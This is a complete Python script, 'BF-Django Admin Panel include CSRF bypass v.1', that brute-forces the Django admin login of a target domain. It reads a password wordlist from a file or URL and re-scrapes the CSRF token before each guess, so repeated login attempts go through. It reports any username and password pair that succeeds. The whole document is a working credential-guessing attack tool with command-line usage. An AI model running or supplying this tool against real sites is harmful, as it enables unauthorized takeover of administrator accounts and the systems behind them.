import sys
import requests
from bs4 import BeautifulSoup

def logo():
    print("""
    
    
 __   ___     __                  __   __          
|__) |__  __ |  \    |  /\  |\ | / _` /  \         
|__) |       |__/ \__/ /~~\ | \| \__> \__/         
      __                   __             ___      
 /\  |  \  |\/| | |\ |    |__)  /\  |\ | |__  |    
/~~\ |__/  |  | | | \|    |    /~~\ | \| |___ |___ 

BF-Django Admin Panel include CSRF bypass v.1 - By Mor David
                                                   """)

class BFLoginPanel:
    def __init__(self, domain: str, username: str, password: str):
        self.domain = domain
        self.username = username
        self.password = password
        self.cookies = {}
        self.session = requests.Session()
        self.url = domain + "/admin/login/?next=/admin"
        self.protocol_mode = "Local File Mode"
        for protocol in ["https://", "http://"]:
            if (password.find(protocol) == 0):
                self.protocol_mode = "Internet Mode"

        print(self.protocol_mode + " (" + self.password + ")")
        self.headers = {
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': self.domain + '/admin/login/?next=/admin'
        }
        if (self.protocol_mode == "Internet Mode"):
            try:
                self.wordlist = list(set(requests.get(password).text.split('\n')))  # read dic and split lines & remove duplicates
            except Exception as e:
                print("[-] Error:\n", e)
                exit()
        else:
            try:
                self.f = open(password, "r")
                self.wordlist = list(set([(word.strip()) for word in self.f.readlines()]))
                self.f.close()
            except Exception as e:
                print("[-] Error:\n", e)
                exit()
        self.login_page = self.session.get(self.url)
        self.BruteForce()

    def BruteForce(self):
        count = 0
        # Start Brute Force
        for self.password in self.wordlist:
            for key, value in self.session.cookies.items():
                self.cookies[key] = value
            self.soup = BeautifulSoup(self.login_page.text, 'html.parser')
            self.csrf_input = self.soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

            url = self.domain + "/admin/login/?next=/admin"
            self.login_page = self.session.post(url, data={'csrfmiddlewaretoken': self.csrf_input,
                                                                'username': self.username,
                                                                'password': self.password}, cookies=self.cookies, headers=self.headers)
            if "CSRF" in self.login_page.text:
                print("[+] Error:\nCSRF token missing or incorrect.")
                exit()
            if "Please " not in self.login_page.text:
                print("[+] Found! " + self.username + " - " + self.password + " - "+ str(self.login_page.status_code)+"\n\n")
                exit()
            else:
                count += 1
                print("(" + str(count) + ") Attempt: " + username + " - " + self.password + " - "+ str(self.login_page.status_code))


if __name__ == '__main__':
    logo()
    try:
        domain = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        BFLoginPanel(domain,username,password)
    except IndexError:
        print(f"Command Line: python {sys.argv[0]} domain username wordlist_file")

